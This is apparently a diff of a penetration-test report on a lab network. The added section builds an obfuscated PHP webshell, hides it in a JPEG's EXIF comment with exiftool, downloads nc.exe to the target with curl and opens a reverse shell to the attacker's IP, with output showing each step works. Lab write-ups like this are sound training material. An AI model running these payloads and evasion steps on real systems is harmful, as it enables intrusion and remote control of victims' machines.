@@ -3,10 +3,8 @@
 ## Table of Contents
 
 - Executive Summary
-- Timeline
-- Findings and Remediations
-- Attack Narrative
-- Cleanup
+- Timelines
+- Targets - Findings and Remediations
 - Conclusion
 - References
 - Appendices
@@ -42,6 +40,8 @@ The sequence is as follows:
    4. maintain access
 
 _____________________________________
+
+## Targets
 
 ## 1. Webserver (`.200`)
 
@@ -163,6 +163,13 @@ ssh -i id_rsa root@10.200.81.200
 [root@prod-serv ~]# id
 uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
 ```
+
+_____________________________________
+
+### Clean up
+
+- TODO
+
 
 </details>
 <br>
@@ -423,6 +430,8 @@ OS Version:                10.0.17763 N/A Build 17763
 ...
 ```
 
+_____________________________________
+
 ### Obtaining a reverse shell
 
 This is a bit more difficult as we want to listen from our Attacking Machine for a nc connection through the Webserver `.200` to the gitserver `.150`. Here we use a socat relay
@@ -471,6 +480,8 @@ whoami
 nt authority\system
 PS C:\GitStack\gitphp> 
 ```
+
+_____________________________________
 
 ### Maintain access
 
@@ -560,11 +571,13 @@ Info: Establishing connection to remote endpoint
 git-serv\administrator
 ```
 
-Clean up
+_____________________________________
+
+### Clean up
+
 - Delete `/tmp/socat-Neozer0` - webserver
 - Delete `/Neozer0-exploit.php` - gitserver
 - Delete user `Neozer0` - gitserver
-
 
 </details>
 <br>
@@ -583,7 +596,7 @@ _____________________________________
   - File extension
   - Image size
 
-<details>
+<details open>
 <summary>Attack Narrative</summary>
 <br>
 
@@ -1010,6 +1023,137 @@ Now we upload this benign payload and access it on the browser to see that the t
 _____________________________________
 
 ### Exploit with AV Evasion 
+
+Given that we know the AV used on the PC is Windows Defender (preinstalled with Windows Server):
+  - We build payload in a slightly less common way
+  - We obfuscate manually or using a tool online
+
+Payload:
+```php
+<?php
+    $cmd = $_GET["wreath"];
+    if(isset($cmd)){
+        echo "<pre>" . shell_exec($cmd) . "</pre>";
+    }
+    die();
+?>
+```
+
+This payload:
+- Checks if `GET` parameter called `wreath` has been set
+- If set, `shell_exec()` executes (lives in `<pre>` tag for clean output)
+- Use `die()` to prevent rest of garble text from image showing up
+
+This is slighly longer than the standard `<?php system($_GET["cmd"]);?>` because
+- Obfuscating will become one liner anyway
+- Being different is good for AV evasion
+
+With the payload, we now obfuscate it by:
+- Switch parts of exploit around so they are in unusual order
+- Encoding all the strings
+- Splitting up distinctive parts of the code (eg. `shell_exec($_GET[...])`)
+
+Here we use online [php obfuscator](https://www.gaijin.at/en/tools/php-obfuscator) with all obfuscation options set and we get:
+```php
+<?php $v0=$_GET[base64_decode('d3JlYXRo')];if(isset($v0)){echo base64_decode('PHByZT4=').shell_exec($v0).base64_decode('PC9wcmU+');}die();?>
+```
+
+The payload will need some escaping because `$` will be interpreted as bash variables
+
+`<?php \$v0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$v0)){echo base64_decode('PHByZT4=').shell_exec(\$v0).base64_decode('PC9wcmU+');}die();?>`
+
+Make a new copy of the image and inject our new payload
+```
+kali@kali:~/thm/wreath$ cp ~/Downloads/corg.jpg ./shell-Neozer0.jpeg.php
+kali@kali:~/thm/wreath$ exiftool -Comment="<?php \$v0=\$_GET[base64_decode('d3JlYXRo')];if(isset(\$v0)){echo base64_decode('PHByZT4=').shell_exec(\$v0).base64_decode('PC9wcmU+');}die();?>" shell-Neozer0.jpeg.php 
+    1 image files updated
+kali@kali:~/thm/wreath$ exiftool shell-Neozer0.jpeg.php
+ExifTool Version Number         : 12.16
+File Name                       : shell-Neozer0.jpeg.php
+Directory                       : .
+File Size                       : 46 KiB
+File Modification Date/Time     : 2021:04:24 08:24:07-04:00
+File Access Date/Time           : 2021:04:24 08:24:07-04:00
+File Inode Change Date/Time     : 2021:04:24 08:24:07-04:00
+File Permissions                : rw-r--r--
+File Type                       : JPEG
+File Type Extension             : jpg
+MIME Type                       : image/jpeg
+JFIF Version                    : 1.01
+Resolution Unit                 : None
+X Resolution                    : 1
+Y Resolution                    : 1
+Comment                         : <?php $v0=$_GET[base64_decode('d3JlYXRo')];if(isset($v0)){echo base64_decode('PHByZT4=').shell_exec($v0).base64_decode('PC9wcmU+');}die();?>
+Image Width                     : 750
+Image Height                    : 750
+Encoding Process                : Progressive DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 3
+Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
+Image Size                      : 750x750
+Megapixels                      : 0.562
+```
+
+Visiting the page we get
+
+![upload success](phpshell.png)
+
+We can execute command with param `wreath` by visiting: `10.200.85.100/resources/uploads/shell-Neozer0.jpeg.php?wreath=systeminfo`
+
+![run systeminfo](phpshellsysinfo.png)
+
+_____________________________________
+
+### Reverse shell
+
+We upload the `nc.exe` to the `c:\windows\temp\` directory
+
+1. Start http server and 
+```
+kali@kali:~/code/nc.exe$ sudo python3 -m http.server 80
+[sudo] password for kali: 
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
+10.200.85.100 - - [24/Apr/2021 08:50:59] "GET /nc.exe HTTP/1.1" 200 -
+
+```
+
+2. Run curl command on webshell `curl http://10.50.86.79/nc64.exe -o c:\\windows\\temp\\nc-Neozer0.exe`
+
+![curl nc](curlnc.png)
+
+3. Set up netcat listener
+```
+kali@kali:~/thm/wreath$ sudo nc -lvnp 49999
+listening on [any] 49999 ...
+
+```
+
+4. Run command to start reverse shell - `10.200.85.100/resources/uploads/shell-Neozer0.jpeg.php?wreath=powershell.exe%20c:\\windows\\temp\\nc-Neozer0.exe%2010.50.86.79%2049999%20-e%20cmd.exe`
+
+![nc reverse shell](ncreverseshell.png)
+
+5. Back on netcat listener we get a shell
+```
+kali@kali:~/thm/wreath$ sudo nc -lvnp 49999
+listening on [any] 49999 ...
+connect to [10.50.86.79] from (UNKNOWN) [10.200.85.100] 50050
+Microsoft Windows [Version 10.0.17763.1637]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\xampp\htdocs\resources\uploads>
+
+```
+
+_____________________________________
+
+### Privilege escalation
+
+_____________________________________
+
+### Clean up
+
+- delete c:\windows\temp\nc-Neozer0.exe
+- delete resources/uploads/shell-Neozer0.jpeg.php
 
 </details>
 
